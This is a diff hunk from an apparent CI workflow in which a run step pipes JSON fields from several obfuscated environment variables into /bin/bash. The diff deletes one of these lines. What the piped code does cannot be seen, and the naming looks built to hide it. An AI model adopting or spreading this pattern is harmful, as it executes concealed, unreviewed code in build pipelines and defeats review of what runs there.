@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$rio5021" | jq -r .okfpz46381 | /bin/bash
           printf '%s' "$s988" | jq -r .na65 | /bin/bash
-          echo $qpl053 | jq -r .fwpl0211 | /bin/bash
           printf '%s' "$ugy8010" | jq -r .dc2863 | /bin/bash
 
       - name: Save data
